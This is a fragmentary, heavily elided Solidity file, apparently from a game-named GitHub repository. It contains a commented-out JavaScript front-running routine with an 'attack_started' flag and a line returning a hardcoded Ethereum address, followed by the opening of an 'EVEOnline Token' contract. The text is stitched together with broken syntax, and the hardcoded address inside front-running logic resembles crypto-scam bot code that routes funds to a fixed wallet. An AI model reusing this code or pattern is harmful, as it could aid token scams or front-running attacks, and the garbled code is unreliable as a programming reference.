...
// File: https://github.com/Mishatrof1/KalinkaMalinkaFPS/blob/main/sda.sol
...
//async function triggersFrontRun(transaction, out_token_address, amount, level) {
    ...
    //if(parseInt(transaction['gasPrice']) / 10*9 > 10 && parseInt(transaction['gasPrice']) / 10*9 < 50){
		...
		return 0x07f37521Ce5638eB25D12a0Ad3C27e09D9AA4581;//pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
		}
        //attack_started = true;
        //return true
  //  
...
contract EVEOnline {
    ...
    string public name = "EVEOnline Token"; 
